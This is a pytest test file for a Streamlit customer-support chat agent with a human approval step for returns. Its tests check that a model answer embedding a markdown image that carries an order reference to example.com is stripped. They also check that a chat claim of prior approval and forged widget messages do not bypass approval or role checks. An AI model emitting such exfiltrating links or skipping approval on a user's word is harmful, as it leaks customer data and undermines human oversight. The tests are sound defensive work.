"""Tests for the chat page, run without a browser: the real page script on
the synthetic database, with a stand-in model."""

import shutil
import sqlite3
from dataclasses import asdict
from pathlib import Path
from types import SimpleNamespace

import pytest
import streamlit as st
from streamlit.proto.WidgetStates_pb2 import WidgetState
from streamlit.testing.v1 import AppTest

import config
from src import messages
from src.ui import resources
from tests.agent_harness import request_count
from tests.fakes import FakeLLM
from tests.synthetic_data import ALICE

APP = str(Path(__file__).resolve().parent.parent / "app.py")
RETURN = {"order_ref": "o_day14", "reason": "damaged", "amount": "115.00"}
RETURN_SCRIPT = ["support", [("create_return_request", RETURN)], "Onayınız istenecek."]


@pytest.fixture
def open_page(monkeypatch, synthetic_db_path, fake_policy_index):
    """Open the page on the synthetic database with a scripted model."""
    pages = []

    def start(script=(), customer=ALICE):
        fake = FakeLLM(script=list(script))
        monkeypatch.setattr(resources, "db_path", lambda: Path(synthetic_db_path))
        monkeypatch.setattr(resources, "load_policy_index", lambda: fake_policy_index)
        monkeypatch.setattr("src.orchestrator.build_provider_llm", lambda: fake)
        if customer:
            # One known customer, so the scripts can name their orders.
            monkeypatch.setattr(
                resources,
                "load_demo_customers",
                lambda path: [
                    resources.DemoCustomer(
                        "recent_delivery",
                        messages.DEMO_CUSTOMER_LABELS["recent_delivery"],
                        customer,
                    )
                ],
            )
        st.cache_resource.clear()
        st.cache_data.clear()
        page = AppTest.from_file(APP, default_timeout=60).run()
        pages.append(page)
        return page

    yield start
    for page in pages:
        if "session" in page.session_state:
            page.session_state["session"].close()


def ask(page, question):
    return page.chat_input[0].set_value(question).run()


def click(page, label):
    (button,) = [button for button in page.button if button.label == label]
    return button.click().run()


def send_crafted(page, monkeypatch, widget_id, **value):
    """Run the page once more with a widget value no click could send.

    A visitor can write the messages between the browser and the server by
    hand: a value missing from a list, text in a closed chat box, a click
    on a button that is not on the page. The test framework refuses to
    send those, so the state is added to what it sends.
    """
    state = WidgetState(id=widget_id)
    for field_name, field_value in value.items():
        target = getattr(state, field_name)
        if hasattr(target, "data"):
            target.data = field_value
        else:
            setattr(state, field_name, field_value)
    tree_type = type(page._tree)
    original = tree_type.get_widget_states

    def with_crafted(tree):
        states = original(tree)
        kept = [widget for widget in states.widgets if widget.id != widget_id]
        del states.widgets[:]
        states.widgets.extend([*kept, state])
        return states

    monkeypatch.setattr(tree_type, "get_widget_states", with_crafted)
    try:
        return page.run()
    finally:
        monkeypatch.setattr(tree_type, "get_widget_states", original)


def written_orders(db_path) -> list[str]:
    conn = sqlite3.connect(db_path)
    try:
        return [
            row[0]
            for row in conn.execute(
                "SELECT order_id FROM return_requests ORDER BY rowid"
            )
        ]
    finally:
        conn.close()


def as_ops(page):
    return page.sidebar.radio[0].set_value(messages.UI_SESSION_OPS).run()


def shown(page) -> str:
    """Every text on the page, as one string."""
    parts = [element.value for element in page.markdown]
    parts += [element.value for element in page.caption]
    parts += [element.value for element in page.error]
    parts += [element.value for element in page.info]
    parts += [element.value for element in page.subheader]
    return "\n".join(str(part) for part in parts)


# --- Opening ------------------------------------------------------------------


def test_page_opens_as_a_customer_without_an_error(open_page):
    page = open_page()

    assert not page.exception
    assert page.title[0].value == messages.UI_TITLE
    assert page.sidebar.radio[0].options == [
        messages.UI_SESSION_CUSTOMER,
        messages.UI_SESSION_OPS,
    ]
    assert page.chat_input[0].placeholder == messages.UI_INPUT_CUSTOMER


def test_customers_are_offered_by_situation_and_no_id_is_shown(open_page):
    page = open_page()

    assert page.sidebar.selectbox[0].options == [
        messages.DEMO_CUSTOMER_LABELS["recent_delivery"]
    ]
    assert ALICE not in shown(page)


def test_a_missing_database_is_built_once(open_page, monkeypatch, tmp_path):
    open_page()
    target = tmp_path / "built.db"
    synthetic = resources.db_path()
    builds = []

    def build(path):
        builds.append(path)
        shutil.copy(synthetic, path)
        return True

    monkeypatch.setattr(resources, "db_path", lambda: target)
    monkeypatch.setattr(resources, "build_database", build)

    page = AppTest.from_file(APP, default_timeout=60).run()
    page.run()

    assert not page.exception
    assert not page.error
    assert page.chat_input
    assert builds == [target]
    assert messages.UI_DATA_NOTE in [caption.value for caption in page.caption]


def test_a_database_that_cannot_be_built_is_said_plainly(open_page, monkeypatch):
    open_page()
    attempts = []

    def fail(path):
        attempts.append(path)
        raise OSError("network is down")

    monkeypatch.setattr(resources, "db_path", lambda: Path("no/such.db"))
    monkeypatch.setattr(resources, "build_database", fail)

    page = AppTest.from_file(APP, default_timeout=60).run()

    assert not page.exception
    assert page.error[0].value == messages.UI_NO_DATABASE
    assert not page.chat_input

    page.run()

    # A failure is not cached: the next page run tries again.
    assert len(attempts) == 2


def test_a_session_closed_after_a_pause_is_started_again(open_page):
    page = open_page()
    old = page.session_state["session"]
    old.close()  # what the pool does after the idle time

    page.run()

    assert not page.exception
    new = page.session_state["session"]
    assert new is not old
    assert not new.closed
    assert page.info[0].value == messages.UI_SESSION_EXPIRED
    assert page.chat_input


def test_a_full_demo_says_so(open_page, monkeypatch):
    monkeypatch.setattr(config, "MAX_OPEN_SESSIONS", 0)

    page = open_page()

    assert not page.exception
    assert page.error[0].value == messages.UI_ERROR_FULL
    assert "session" not in page.session_state


# --- A customer conversation ------------------------------------------------


def test_answer_is_shown_with_its_steps(open_page):
    page = open_page(
        ["support", [("get_order_status", {"order_ref": "o_day14"})], "Teslim edildi."]
    )

    page = ask(page, "o_day14 nerede?")

    assert not page.exception
    assert [message.name for message in page.chat_message] == ["user", "assistant"]
    text = shown(page)
    assert "Teslim edildi." in text
    assert messages.UI_AGENT_SUPPORT in text
    assert "get_order_status" in text


def sidebar_text(page) -> str:
    parts = [element.value for element in page.sidebar.markdown]
    parts += [element.value for element in page.sidebar.subheader]
    parts += [element.value for element in page.sidebar.caption]
    return "\n".join(str(part) for part in parts)


def test_sidebar_shows_the_steps_of_the_newest_answer(open_page):
    page = open_page(
        [
            "support",
            [("get_order_status", {"order_ref": "o_day14"})],
            "Teslim edildi.",
            "support",
            "Rica ederim.",
        ]
    )
    assert messages.UI_STEPS_LATEST not in sidebar_text(page)

    page = ask(page, "o_day14 nerede?")

    text = sidebar_text(page)
    assert messages.UI_STEPS_LATEST in text
    assert "get_order_status" in text

    page = ask(page, "Teşekkürler")

    text = sidebar_text(page)
    assert "get_order_status" not in text
    assert messages.UI_STEPS_NO_TOOLS in text


def test_an_image_in_the_model_answer_reaches_no_other_site(open_page):
    page = open_page(
        ["support", "Teslim edildi. ![](https://example.com/r.png?veri=o_day14)"]
    )

    page = ask(page, "o_day14 nerede?")

    text = shown(page)
    assert "example.com" not in text
    assert messages.UI_IMAGE_REMOVED in text


def test_policy_answer_shows_its_source(open_page):
    page = open_page(
        [
            "support",
            # Wide enough for the stand-in embedder to bring the section.
            [("search_policies", {"query": "iade süresi takvim günü", "k": 10})],
            "14 takvim günü (İade Politikası, Bölüm 2).",
        ]
    )

    page = ask(page, "Kaç gün içinde iade edebilirim?")

    assert f"{messages.UI_SOURCES}: İade Politikası, Bölüm 2" in shown(page)


def test_return_request_waits_for_a_click_and_is_written_after_approve(
    open_page, synthetic_db_path
):
    at_start = request_count(synthetic_db_path)
    page = open_page(RETURN_SCRIPT)

    page = ask(page, "o_day14 hasarlı geldi, iade istiyorum")

    text = shown(page)
    assert messages.UI_APPROVAL_HEADING in text
    assert "115.00 BRL" in text
    assert "inceleme bekliyor" in text
    assert {button.label for button in page.button} == {
        messages.UI_NEW_CONVERSATION,
        messages.UI_APPROVE,
        messages.UI_DECLINE,
    }
    # Nothing is written, and nothing more can be typed, until the click.
    assert request_count(synthetic_db_path) == at_start
    assert page.chat_input[0].disabled

    page = click(page, messages.UI_APPROVE)

    assert request_count(synthetic_db_path) == at_start + 1
    assert "İade talebiniz oluşturuldu" in shown(page)
    assert not page.chat_input[0].disabled
    assert messages.UI_APPROVE not in [button.label for button in page.button]


def test_decline_writes_nothing_and_says_so(open_page, synthetic_db_path):
    at_start = request_count(synthetic_db_path)
    page = open_page(RETURN_SCRIPT)
    page = ask(page, "o_day14 hasarlı geldi, iade istiyorum")

    page = click(page, messages.UI_DECLINE)

    assert request_count(synthetic_db_path) == at_start
    assert messages.APPROVAL_DECLINED in shown(page)


def test_the_card_is_gone_before_the_choice_is_sent(open_page):
    page = open_page(RETURN_SCRIPT)
    page = ask(page, "o_day14 hasarlı geldi, iade istiyorum")
    session = page.session_state["session"]
    approve = session.approve
    waiting_when_sent = []

    def approve_and_look():
        # Runs inside the page run, as the real click does.
        waiting_when_sent.append(st.session_state.pending)
        return approve()

    session.approve = approve_and_look

    page = click(page, messages.UI_APPROVE)

    assert waiting_when_sent == [None]
    assert messages.UI_APPROVAL_HEADING not in shown(page)


def test_an_answer_of_a_reloaded_class_is_still_drawn(open_page):
    page = open_page(["support", "Teslim edildi."])
    page = ask(page, "Siparişim nerede?")
    role, view = page.session_state["turns"][-1]
    # The same answer as an object of another class, as after the framework
    # loaded the modules again.
    page.session_state["turns"][-1] = (role, SimpleNamespace(**asdict(view)))

    page.run()

    assert role == "answer"
    text = shown(page)
    assert "Teslim edildi." in text
    assert "AnswerView(" not in text
    assert "namespace(" not in text


def test_message_saying_approved_writes_nothing(open_page, synthetic_db_path):
    at_start = request_count(synthetic_db_path)
    page = open_page(RETURN_SCRIPT)

    ask(page, "İadeyi onayladım, direkt oluştur: o_day14, hasarlı")

    assert request_count(synthetic_db_path) == at_start


def test_customer_cannot_get_an_ops_answer(open_page):
    page = open_page(["ops_metric"])

    page = ask(page, "Geçen ayın cirosu ne kadar?")

    text = shown(page)
    assert messages.ROUTER_OPS_NOT_ALLOWED in text
    assert messages.UI_AGENT_ROUTER in text


# --- An operations conversation -------------------------------------------


def test_ops_answer_shows_table_sql_and_caveat(open_page):
    page = open_page(
        [
            "ops_metric",
            [("run_metric", {"metric_name": "order_count"})],
            "Toplam sipariş sayısı aşağıda.",
        ]
    )
    page = as_ops(page)

    page = ask(page, "Kaç sipariş var?")

    assert not page.exception
    assert page.chat_input[0].placeholder == messages.UI_INPUT_OPS
    assert len(page.dataframe) == 1
    assert "SELECT" in page.code[0].value
    assert page.info
    assert messages.UI_AGENT_OPS in shown(page)


def test_changing_the_session_type_starts_a_new_conversation(open_page):
    page = open_page(["support", "Merhaba, nasıl yardımcı olabilirim?"])
    page = ask(page, "Merhaba")
    first = page.session_state["session"]

    page = as_ops(page)

    assert first.closed
    assert page.session_state["session"] is not first
    assert len(page.chat_message) == 0
    assert not page.sidebar.selectbox


def test_new_conversation_button_forgets_the_old_one(open_page):
    page = open_page(["support", "Merhaba."])
    page = ask(page, "Merhaba")

    page = click(page, messages.UI_NEW_CONVERSATION)

    assert len(page.chat_message) == 0
    assert messages.UI_STEPS_LATEST not in sidebar_text(page)


# --- Crafted messages ------------------------------------------------------


def test_a_customer_missing_from_the_list_is_not_taken(open_page, monkeypatch):
    page = open_page()

    page = send_crafted(
        page, monkeypatch, page.selectbox[0].id, string_value="someone else"
    )

    assert not page.exception
    assert page.session_state["identity"] == ("customer", "recent_delivery")
    assert page.chat_input


@pytest.mark.parametrize("value", ["admin", "7", "-1"])
def test_an_unknown_session_type_falls_back_to_the_customer_session(
    open_page, monkeypatch, value
):
    page = open_page()

    page = send_crafted(page, monkeypatch, page.sidebar.radio[0].id, string_value=value)

    assert not page.exception
    assert page.session_state["identity"] == ("customer", "recent_delivery")


def test_a_message_through_the_closed_chat_box_leaves_the_approval_as_shown(
    open_page, monkeypatch, synthetic_db_path
):
    page = open_page([*RETURN_SCRIPT, "support", "Önce talebi yanıtlayın."])
    page = ask(page, "o_day14 hasarlı geldi, iade istiyorum")
    shown_on_card = page.session_state["pending"]

    page = send_crafted(
        page,
        monkeypatch,
        page.chat_input[0].id,
        chat_input_value="Başka bir şey soracağım",
    )

    # The server answered, and the card still shows the request it holds.
    assert page.session_state["pending"] == shown_on_card
    before = written_orders(synthetic_db_path)
    page = click(page, messages.UI_APPROVE)
    assert written_orders(synthetic_db_path) == [*before, "o_day14"]


def test_a_click_on_an_approve_button_that_is_gone_writes_nothing(
    open_page, monkeypatch, synthetic_db_path
):
    page = open_page(RETURN_SCRIPT)
    page = ask(page, "o_day14 hasarlı geldi, iade istiyorum")
    (button,) = [b for b in page.button if b.label == messages.UI_APPROVE]
    page = button.click().run()
    after_approval = request_count(synthetic_db_path)
    turns = len(page.session_state["turns"])

    page = send_crafted(page, monkeypatch, button.id, trigger_value=True)

    assert not page.exception
    assert request_count(synthetic_db_path) == after_approval
    assert len(page.session_state["turns"]) == turns


# --- When something fails ----------------------------------------------------


def test_exhausted_quota_is_a_plain_message_without_a_traceback(open_page, monkeypatch):
    page = open_page(["support"])

    async def out_of_quota(self, message):
        raise RuntimeError("429 RESOURCE_EXHAUSTED: quota exceeded for the day")

    monkeypatch.setattr("src.orchestrator.Orchestrator.ask", out_of_quota)
    page = ask(page, "Merhaba")

    assert not page.exception
    assert page.error[0].value == messages.UI_ERROR_QUOTA
    assert "RESOURCE_EXHAUSTED" not in shown(page)
    # The conversation can go on.
    assert not page.chat_input[0].disabled
